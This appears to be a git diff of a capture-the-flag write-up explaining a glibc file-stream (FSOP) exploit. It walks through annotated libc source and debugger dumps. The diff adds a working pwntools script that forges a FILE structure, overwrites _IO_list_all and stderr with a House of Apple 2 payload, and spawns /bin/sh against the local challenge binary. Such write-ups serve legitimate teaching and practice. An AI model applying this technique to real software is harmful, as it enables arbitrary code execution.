@@ -24,7 +24,7 @@ For bug reporting instructions, please see:
 ```
 ```md
 Basic information
-Canary                                  : Disabled
+Canary                                  : Disabled(will it work?)
 NX                                      : Enabled
 PIE                                     : Enabled
 RELRO                                   : Full RELRO
@@ -36,7 +36,7 @@ Fortify                                 : Not found
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   setvbuf(stdin, 0LL, 2, 0LL);
-  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);//religious buffering
   Ox78();
   return 0;
 }
@@ -54,12 +54,12 @@ __int64 Ox78()
     "I'm trying to test my FSOP prevention mechanism so I can share it with my coworkers who know nothing about security."
     " It should be foolproof right?\n");
   printf("Here's the address of the File Structure: 0x%llx\n", fp);
-  v0 = (const void *)puts_got_value();
+  v0 = (const void *)puts_got_value();//ptsd
   printf("I'm pretty confident you can't break out of this, so I'll give you a libc leak as well: %p\n\n", v0);
   read(0, fp, 0x78uLL);
-  prevent_fsop();
-  fread(testbuf, 1uLL, 0x78uLL, fp);
-  prevent_fsop();
+  prevent_fsop();//will it work?
+  fread(testbuf, 1uLL, 0x78uLL, fp);//gem alert
+  prevent_fsop();//will it work?
   return 0LL;
 }
 ```
@@ -102,7 +102,7 @@ _IO_fread (void *buf, size_t size, size_t count, FILE *fp)
 {
   size_t bytes_requested = size * count;
   size_t bytes_read;
-  CHECK_FILE (fp, 0);
+  CHECK_FILE (fp, 0);//not in disassembly
   if (bytes_requested == 0)
     return 0;
   _IO_acquire_lock (fp);
@@ -132,47 +132,8 @@ _IO_sgetn is just a call to _IO_XSGETN which is a jump to a pointer in vtable. I
 0x7e996ea91f60 <__GI__IO_sgetn> (
    FILE* fp = 0x000057d173e45320  ->  0x0000000000000800,->fp
    void* data = 0x000057d173e452a0  ->  0x0000000000000000,->test_buffer
-   size_t n = 0x0000000000000078,->length
+   size_t n = 0x0000000000000078,->size_of_test_buffer
 )
-```
-This is the heap structure for better understanding!
-```md
-0x57d173e45000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 |
-0x57d173e45010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 |
-* 39 lines, 0x270 bytes
---test buffer-----------------------------------------------------------
-0x57d173e45290|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000081 |  |
-0x57d173e452a0|+0x00010|+0x002a0: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e452b0|+0x00020|+0x002b0: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e452c0|+0x00030|+0x002c0: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e452d0|+0x00040|+0x002d0: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e452e0|+0x00050|+0x002e0: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e452f0|+0x00060|+0x002f0: 0x0000000000000000 0x0000000000000000 |
-0x57d173e45300|+0x00070|+0x00300: 0x0000000000000000 0x0000000000000000 |
--------------------------------------------------------------------------
-0x57d173e45310|+0x00000|+0x00310: 0x0000000000000000 0x00000000000001e1 |
---starting of file structure(fp)----------------------------------------
-0x57d173e45320|+0x00010|+0x00320: 0x0000000000000800 0x0000000000000000 |
-0x57d173e45330|+0x00020|+0x00330: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e45340|+0x00030|+0x00340: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e45350|+0x00040|+0x00350: 0x0000000000000000 0x00007e996ec19660 |
-0x57d173e45360|+0x00050|+0x00360: 0x00007e996ec19780 0x0000000000000000 |
-0x57d173e45370|+0x00060|+0x00370: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e45380|+0x00070|+0x00380: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e45390|+0x00080|+0x00390: 0x0000000000000000 0x0000000000000000 |  |
-0x57d173e453a0|+0x00090|+0x003a0: 0x0000000000000000 0x000057d173e45400 |
-0x57d173e453b0|+0x000a0|+0x003b0: 0xffffffffffffffff 0x0000000000000000 |  |
-0x57d173e453c0|+0x000b0|+0x003c0: 0x000057d173e45410 0x0000000000000000 |
-0x57d173e453d0|+0x000c0|+0x003d0: 0x0000000000000000 0x0000000000000000 |
-0x57d173e453e0|+0x000d0|+0x003e0: 0x0000000000000000 0x0000000000000000 |
-0x57d173e453f0|+0x000e0|+0x003f0: 0x0000000000000000 0x00007e996ec1a560 |
-0x57d173e45400|+0x000f0|+0x00400: 0x0000000100000001 0x00007e996ec92740 |
-0x57d173e45410|+0x00100|+0x00410: 0x0000000000000000 0x0000000000000000 |
-* 13 lines, 0xd0 bytes
-0x57d173e454f0|+0x00000|+0x004f0: 0x00007e996ec1a020 0x0000000000020b11 |
-(this is the memory strcuture a/ exploit script->change it with ASLR OFF)
-```
-```asm
  -> 0x7e996ea83c34 e827e30000            <fread+0x74>   call   0x7e996ea91f60 <__GI__IO_sgetn>
 
    -> 0x7e996ea91f60 f30f1efa              <_IO_sgetn>   endbr64
@@ -184,7 +145,6 @@ This is the heap structure for better understanding!
 
 ```
 Below is the implementation of _IO_file_xsgetn.
-
 
 ```c
 size_t
@@ -261,32 +221,56 @@ __underflow (FILE *fp)
   if (fp->_mode == 0)
     _IO_fwide (fp, -1);
   if (_IO_in_put_mode (fp))/*#define _IO_in_put_mode(_fp) ((_fp)->_flags & _IO_CURRENTLY_PUTTING)*/
-    if (_IO_switch_to_get_mode (fp) == EOF)
+    if (_IO_switch_to_get_mode (fp) == EOF)//_flags is now 0x0(if ^ condition is fulfilled)
       return EOF;
-  if (fp->_IO_read_ptr < fp->_IO_read_end)
+  if (fp->_IO_read_ptr < fp->_IO_read_end)//ignore
     return *(unsigned char *) fp->_IO_read_ptr;
-  if (_IO_in_backup (fp))/*#define _IO_have_backup(fp) ((fp)->_IO_save_base != NULL)*/
+  if (_IO_in_backup (fp))/*#define _IO_in_backup(fp) ((fp)->_flags & _IO_IN_BACKUP))*///ignored
     {
       _IO_switch_to_main_get_area (fp);
       if (fp->_IO_read_ptr < fp->_IO_read_end)
 	return *(unsigned char *) fp->_IO_read_ptr;
     }
-  if (_IO_have_markers (fp))/*#define _IO_have_markers(fp) ((fp)->_markers != NULL) */
+  if (_IO_have_markers (fp))/*#define _IO_have_markers(fp) ((fp)->_markers != NULL) *///ignored
     {
       if (save_for_backup (fp, fp->_IO_read_end))
 	return EOF;
     }
-  else if (_IO_have_backup (fp))/*#define _IO_have_backup(fp) ((fp)->_IO_save_base != NULL)*/
+  else if (_IO_have_backup (fp))/*#define _IO_have_backup(fp) ((fp)->_IO_save_base != NULL)*///ignored
     _IO_free_backup_area (fp);
   return _IO_UNDERFLOW (fp);
 }
 libc_hidden_def (__underflow)
 ```
 Somehow we have to find a path that will successfully reach this return _IO_UNDERFLOW (fp).
-Most of the above condition is just one loc defined as macro in libiop.h and is very easy to read.I don't wanna yoink everything cuz I am lazy...
+Most of the above condition is just one loc defined as macro in libiop.h and is very easy to read.
 
 ```c
 
+int
+_IO_switch_to_get_mode (FILE *fp)
+{
+  if (fp->_IO_write_ptr > fp->_IO_write_base)
+    if (_IO_OVERFLOW (fp, EOF) == EOF)
+      return EOF;
+  if (_IO_in_backup (fp))
+    fp->_IO_read_base = fp->_IO_backup_base;
+  else
+    {
+      fp->_IO_read_base = fp->_IO_buf_base;
+      if (fp->_IO_write_ptr > fp->_IO_read_end)
+	fp->_IO_read_end = fp->_IO_write_ptr;
+    }
+  fp->_IO_read_ptr = fp->_IO_write_ptr;
+
+  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_read_ptr;
+
+  fp->_flags &= ~_IO_CURRENTLY_PUTTING;//_flags = 0x0;
+  return 0;//not EOF so fine!
+}
+libc_hidden_def (_IO_switch_to_get_mode)
+
+//right now _flags = 0x0; so most of the "and" condition ->false
 int
 _IO_new_file_underflow (FILE *fp)
 {
@@ -344,7 +328,7 @@ _IO_new_file_underflow (FILE *fp)
   fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
     = fp->_IO_buf_base;
 /*Gem Alert!!! */
-
+//rdi->0x0; rsi->user controlled, rdx->user controlled
   count = _IO_SYSREAD (fp, fp->_IO_buf_base,
 		       fp->_IO_buf_end - fp->_IO_buf_base);
            /*do not care loc!!!!*/
@@ -414,19 +398,37 @@ This is most of the bits that will manipulate the path as most of the if conditi
 Listing all of the conditions-
 - fp->_IO_buf_base -> start of the write address.
 - fp->_IO_buf_end ->end of the write address.
-- length = fp->_IO_buf_end - fp->_IO_buf_base and this should be greater than want which is 0x78.
-- _flag & ~_IO_NO_WRITES
-- _flag |= _IO_CURRENTLY_PUTTING
-
-To explain how the flags will be used I will again copypasta source code(i am sowwwy).
-//TODO:explain the flag
+- length = fp->_IO_buf_end - fp->_IO_buf_base and this should be greater than ```want``` which is 0x78.
+- _flag |= _IO_CURRENTLY_PUTTING(so that _flags = 0x0)
+- Rest all pointers zero (less condition true less headache )
 
 
 ### Exploit
-Context: After getting arbitrary write, I mindlessly went for house of apple 2 cuz why not? so I overwrote stderr with payload that I made long ago and waited for low cortisol shell,but what i recevied was high cortisol EOF.
+```python
+fp = pack(0xfbad0800)#0x0
+fp =pack(0x800)#this is fine as long as there is no CHECK_FILE(fp)
+fp +=pack(0x0)#8
+fp+=pack(0x0)#10
+fp+=pack(0x0)#18
+fp+=pack(0x0)#20
+fp+=pack(0x0)#28
+fp+=pack(0x0)#30
+fp+=pack(0xdeadbeef)#38(buf_base)
+fp+=pack(0xdeadbeef+0x100)#40(buf_end)
+# fp +=pack(stderr-0x20)
+# fp+=pack(stderr+0xe0+0x20)
+fp+=pack(0x0)#48
+fp+=p8(0x0)*(0x68-len(fp))
+fp+=pack(libc_leak+0x1947b0)
+fp+=pack(0x0)
+
+io.send(fp)
+```
+
+Context: After getting arbitrary write, I mindlessly went for house of apple 2 cuz why not?  I overwrote stderr with payload that I made long ago and waited for low cortisol shell,but what i recevied was high cortisol EOF.
 
 I am not explaining house of apple 2. there are tons of blogs on internet and that explains better!
-well EOF is not shell so I started debugging exit handler in gdb and reached at this code.
+well EOF is not shell so I started debugging exit_handler in gdb and reached at this code.
 
 ```c
 
@@ -468,8 +470,7 @@ _IO_flush_all_lockp (int do_lock)
   return result;
 }
 ```
-My payload relied on the fact that _IO_OVERFLOW (fp, EOF) this should be called with fp as stderr which should be easy peasy cuz
-_IO_list_all is linked list that points to stderr. and then next fp traverses via _chain.But guess what i did not account for ,the new file structure which was allocated on heap.May be I did but I think, I assumed it to be placed at the end of linked list which was not the case.
+My payload relied on the fact that _IO_OVERFLOW (fp, EOF) -> this should be called with fp as stderr which should be easy peasy cuz _IO_list_all is linked list that points to stderr. and then next fp traverses via _chain.But guess what i did not account for ,the new file structure which was allocated on heap.May be I did but I think, I assumed it to be placed at the end of linked list which was not the case.
 and the reason is this
 ```c
 
@@ -497,7 +498,7 @@ _IO_link_in (struct _IO_FILE_plus *fp)
 }
 libc_hidden_def (_IO_link_in)
 ```
-fopen internally calls this function _IO_link_in and fp is inserted at the head of the linked list so now __GI__IO_list_all is like fp->stderr->stdout->stdin->0x0 and before exiting prevent_fsop nulls the _chain which breaks the linked list to only fp->0x0 and thus EOF.
+fopen internally calls this function _IO_link_in and fp is inserted at the head of the linked list so now __GI__IO_list_all is like ```fp->stderr->stdout->stdin->0x0``` and before exiting prevent_fsop nulls the _chain which breaks the linked list to only ```fp->0x0``` and thus EOF.
 ```asm
  -> 0x79b097e9137a 488b15df821800        <_IO_link_in+0xfa>   mov    rdx, QWORD PTR [rip + 0x1882df] # 0x79b098019660 <__GI__IO_list_all>
     0x79b097e91381 83470401              <_IO_link_in+0x101>   add    DWORD PTR [rdi + 0x4], 0x1
@@ -506,7 +507,7 @@ fopen internally calls this function _IO_link_in and fp is inserted at the head 
     0x79b097e91390 48895368              <_IO_link_in+0x110>   mov    QWORD PTR [rbx + 0x68], rdx
 
 ```
-After debugging in gef, I found that __GI__IO_list_all is very close to _IO_2_1_stderr.
+While debugging in gef, I found that __GI__IO_list_all is very close to _IO_2_1_stderr.
 ```asm
 0x79b098019660 <__GI__IO_list_all>:	0x0000633a85c90320	0x0000000000000000
 0x79b098019670:	                    0x0000000000000000	0x0000000000000000
@@ -515,7 +516,88 @@ After debugging in gef, I found that __GI__IO_list_all is very close to _IO_2_1_
 0x79b0980196a0 <_IO_2_1_stderr_+32>:0x0000000000000000	0x0000000000000000
 ```
 And with arb write primitive and libc leak, I just overwrote list_all to stderr thus calling _IO_OVERFLOW with fp as stderr
-and profit!!
+and shell!!
+```python
+from pwn import *
+elf = context.binary = ELF("./chall")
+libc = ELF("./libc.so.6")
+context.log_level = "Debug"
+
+io = process()
+io.recvuntil(b"Structure:")
+heap_leak = int(io.recvn(0xf),0x10)
+print(hex(heap_leak))
+io.recvuntil(b"well:")
+
+
+libc_leak = int(io.recvn(0xf),0x10)
+print(hex(libc_leak))
+# gdb.attach(io,gdbscript ='''break *fread''')
+stderr = libc_leak+0x1947b0
+
+libc.address = stderr-libc.sym['_IO_2_1_stderr_']
+fp = pack(0x800)#0x0
+fp +=pack(0x0)#8
+fp+=pack(0x0)#10
+fp+=pack(0x0)#18
+fp+=pack(0x0)#20
+fp+=pack(0x0)#28
+fp+=pack(0x0)#30
+fp +=pack(stderr-0x20)
+fp+=pack(stderr+0xe0+0x20)
+
+fp+=pack(0x0)#48
+fp+=p8(0x0)*(0x68-len(fp))
+fp+=pack(libc_leak+0x1947b0)
+fp+=pack(0x0)
+
+io.send(fp)
+print(len(fp))
+
+
+#########stderr payload#####################
+
+libc_base =libc.address
+stderr_address = stderr
+system_addr = libc_base+libc.sym.system
+fake_wide_data = stderr_address-0x48
+wide_vtable  = stderr_address
+
+
+print(hex(wide_vtable))
+lock = libc_base+0x21b730
+fake_stderr_vtable = libc_base+0x21a020#io_Wfile_jumps
+lock = 0x0
+chain = libc_base+0x218a80
+
+payload=pack(stderr)
+payload +=pack(0x0)*0x3
+payload +=pack(0x3b01010101010101)#0x0
+payload+=b"/bin/sh\x00"#0x8
+payload+=pack(0x0)#0x10
+payload+=b"\x00"*(0x20-0x18)
+payload +=pack(0x0)#0x20
+payload+=pack(0x1)#0x28
+payload+=p8(0x0)*(0x60-0x30)
+payload+=pack(libc_base+0x54ae0)#60
+payload+=pack(chain)#68
+payload+=p8(0x0)*(0x88-0x70)
+payload+=pack(lock)#0x88
+payload+=p8(0x0)*(0x98-0x90)#0x90
+payload+=pack(wide_vtable-0x8)#0x98
+payload+=p8(0x0)*(0xa0-0x90-0x10)
+payload+=pack(fake_wide_data)#a0
+payload+=pack(0x0)#a8
+payload+=p8(0x0)*(0xd8-0xa8-0x8)
+payload+=pack(fake_stderr_vtable)
+
+print(f"fake wide data address = {hex(fake_wide_data)}")
+print(f"fake_wide vtable address is {hex(wide_vtable)}")
+print(f"libc base address:{hex(libc_base)}")
+print(len(payload))
+io.sendline(payload)
+io.interactive()
+```
 
 ### A better exploit?
 As libc version is 2.34, tls sections is alligned with libc sections and thus we can also overwrite dtor_list struct and get shell.I am too lazy to make exploit with this but I will just yoink the src code and disassembly and explain some stuff.
